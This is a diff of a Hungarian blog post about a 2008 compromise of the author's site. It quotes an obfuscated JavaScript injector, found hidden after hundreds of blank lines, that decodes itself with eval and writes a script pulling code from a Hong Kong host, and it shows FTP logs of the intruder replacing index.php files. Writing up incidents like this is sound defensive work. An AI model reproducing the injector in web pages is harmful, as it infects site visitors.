@@ -16,7 +16,7 @@ Rémálom baszki.
 
 Gondos házigazda lévén, rendszeresen nézegetem az oldalaimat, hogy minden rendben van-e, nem kell-e valami hozzászólást kimoderálni stb. Vasárnap feltűnt valami kis apróság. A böngészőm a csokavar.hu főoldalán valami ismeretlen add-in-t akart futtatni. Márpedig én ilyet nem írtam sehova. Aztán nézem a forrást, és 500-600 üres sorral a fájl általam gondolt vége után találtam egy ilyet:
 
-<script language=JavaScript>var sf=" shapgvba cwzgq(d){ine xp,yfl="r|b'RhkB\_98\[5)XsvAPClwHix.e,2o:$uyT^&Vqa36Nd=-Z\\"{\`z\]m@GS;UIc# 0}jWMt1pf7~(n4O\*+g!",xn="",c,wah,xs="",pr;sbe(xp=0;xp<d.yratgu;xp++){ c=d.puneNg(xp);wah=yfl.vaqrkBs(c);vs(wah>-1){ pr=((wah+1)%81-1);vs(pr<=0)pr+=81;xs+=yfl.puneNg(pr-1); } ryfr xs+=c;}xn+=xs;qbphzrag.jevgr(xn);}",aarf="";for(nyf=0;nyf<sf.length;nyf++){ cqd = sf.charCodeAt(nyf);if((cqd>64 && cqd<78)||(cqd>96 && cqd<110)) cqd=cqd+13;else if((cqd>77 && cqd<91)||(cqd>109 && cqd<123))cqd=cqd-13;aarf=aarf.concat(String.fromCharCode(cqd));} var hw,u; eval( aarf );hw="<7s,N#!0G431x41|-{U4k47s,N#!{>0n'sx\]|3!rJ,N!|a0{<SPRdyF0G431x41|-\\{Z4k4Ss,N#!\\{0SRP-\\{l!!#$//JJJr1''1G|M434Gj!Gs7rs'\]/99x!!rU7?{tn'sx\]|3!r,|i|,,|,t{\\{><\\/SPRdyF>{0KH0</7s,N#!>0"; pjmtd(hw);</script>
+<script language=JavaScript>var sf=" shapgvba cwzgq(d){ine xp,yfl="r|b'RhkB_98[5)XsvAPClwHix.e,2o:$uyT^&Vqa36Nd=-Z"{`z]m@GS;UIc# 0}jWMt1pf7~(n4O*+g!",xn="",c,wah,xs="",pr;sbe(xp=0;xp<d.yratgu;xp++){ c=d.puneNg(xp);wah=yfl.vaqrkBs(c);vs(wah>-1){ pr=((wah+1)%81-1);vs(pr<=0)pr+=81;xs+=yfl.puneNg(pr-1); } ryfr xs+=c;}xn+=xs;qbphzrag.jevgr(xn);}",aarf="";for(nyf=0;nyf<sf.length;nyf++){ cqd = sf.charCodeAt(nyf);if((cqd>64 && cqd<78)||(cqd>96 && cqd<110)) cqd=cqd+13;else if((cqd>77 && cqd<91)||(cqd>109 && cqd<123))cqd=cqd-13;aarf=aarf.concat(String.fromCharCode(cqd));} var hw,u; eval( aarf );hw="<7s,N#!0G431x41|-{U4k47s,N#!{>0n'sx]|3!rJ,N!|a0{<SPRdyF0G431x41|-{Z4k4Ss,N#!{0SRP-{l!!#$//JJJr1''1G|M434Gj!Gs7rs']/99x!!rU7?{tn'sx]|3!r,|i|,,|,t{{></SPRdyF>{0KH0</7s,N#!>0"; pjmtd(hw);</script>
 
 Szoktam ronda kódot írni, de azért ez... 
 
@@ -24,27 +24,21 @@ Kiderült, hogy fenti szutyok valami Hong Kongi gépről (58.65.238.60) próbál
 
 Aztán elkezdtem a logokat böngészni, míg az FTP logban a következőre nem bukkantam:
 
-Fri Feb 1 23:58:06 2008 \[pid 7784\] \[encse\] OK LOGIN: Client "58.65.238.59"
+```
 
-Fri Feb 1 23:58:12 2008 \[pid 7787\] \[encse\] OK DOWNLOAD: Client "58.65.238.59", "/public\_html/www/index.php", 3904 bytes, 16.06Kbyte/sec
+Fri Feb 1 23:58:06 2008 [pid 7784] [encse] OK LOGIN: Client "58.65.238.59"
+Fri Feb 1 23:58:12 2008 [pid 7787] [encse] OK DOWNLOAD: Client "58.65.238.59", "/public_html/www/index.php", 3904 bytes, 16.06Kbyte/sec
+Fri Feb 1 23:58:14 2008 [pid 7787] [encse] OK UPLOAD: Client "58.65.238.59", "/public_html/www/index.php", 5498 bytes, 11.47Kbyte/sec
+Fri Feb 1 23:58:16 2008 [pid 7787] [encse] OK DOWNLOAD: Client "58.65.238.59", "/public_html/gekko/index.php", 92 bytes, 0.39Kbyte/sec
+Fri Feb 1 23:58:18 2008 [pid 7787] [encse] OK UPLOAD: Client "58.65.238.59", "/public_html/gekko/index.php", 1686 bytes, 3.49Kbyte/sec
+Fri Feb 1 23:58:21 2008 [pid 7787] [encse] OK DOWNLOAD: Client "58.65.238.59", "/public_html/blog/index.php", 54 bytes, 0.23Kbyte/sec
+Fri Feb 1 23:58:23 2008 [pid 7787] [encse] OK UPLOAD: Client "58.65.238.59", "/public_html/blog/index.php", 1648 bytes, 3.43Kbyte/sec
+Fri Feb 1 23:58:26 2008 [pid 7787] [encse] OK DOWNLOAD: Client "58.65.238.59", "/public_html/zsonglor/index.php", 5645 bytes, 24.04Kbyte/sec
+Fri Feb 1 23:58:28 2008 [pid 7787] [encse] OK UPLOAD: Client "58.65.238.59", "/public_html/zsonglor/index.php", 7239 bytes, 10.81Kbyte/sec
+Fri Feb 1 23:58:31 2008 [pid 7787] [encse] OK DOWNLOAD: Client "58.65.238.59", "/public_html/zsonglor/siteswap/index.php", 7102 bytes, 16.60Kbyte/sec
+Fri Feb 1 23:58:33 2008 [pid 7787] [encse] OK UPLOAD: Client "58.65.238.59", "/public_html/zsonglor/siteswap/index.php", 8696 bytes, 12.99Kbyte/sec
 
-Fri Feb 1 23:58:14 2008 \[pid 7787\] \[encse\] OK UPLOAD: Client "58.65.238.59", "/public\_html/www/index.php", 5498 bytes, 11.47Kbyte/sec
-
-Fri Feb 1 23:58:16 2008 \[pid 7787\] \[encse\] OK DOWNLOAD: Client "58.65.238.59", "/public\_html/gekko/index.php", 92 bytes, 0.39Kbyte/sec
-
-Fri Feb 1 23:58:18 2008 \[pid 7787\] \[encse\] OK UPLOAD: Client "58.65.238.59", "/public\_html/gekko/index.php", 1686 bytes, 3.49Kbyte/sec
-
-Fri Feb 1 23:58:21 2008 \[pid 7787\] \[encse\] OK DOWNLOAD: Client "58.65.238.59", "/public\_html/blog/index.php", 54 bytes, 0.23Kbyte/sec
-
-Fri Feb 1 23:58:23 2008 \[pid 7787\] \[encse\] OK UPLOAD: Client "58.65.238.59", "/public\_html/blog/index.php", 1648 bytes, 3.43Kbyte/sec
-
-Fri Feb 1 23:58:26 2008 \[pid 7787\] \[encse\] OK DOWNLOAD: Client "58.65.238.59", "/public\_html/zsonglor/index.php", 5645 bytes, 24.04Kbyte/sec
-
-Fri Feb 1 23:58:28 2008 \[pid 7787\] \[encse\] OK UPLOAD: Client "58.65.238.59", "/public\_html/zsonglor/index.php", 7239 bytes, 10.81Kbyte/sec
-
-Fri Feb 1 23:58:31 2008 \[pid 7787\] \[encse\] OK DOWNLOAD: Client "58.65.238.59", "/public\_html/zsonglor/siteswap/index.php", 7102 bytes, 16.60Kbyte/sec
-
-Fri Feb 1 23:58:33 2008 \[pid 7787\] \[encse\] OK UPLOAD: Client "58.65.238.59", "/public\_html/zsonglor/siteswap/index.php", 8696 bytes, 12.99Kbyte/sec
+``` 
 
 Ugyanaz a Hong Kongi IP, közvetlen a másik mellett.
 
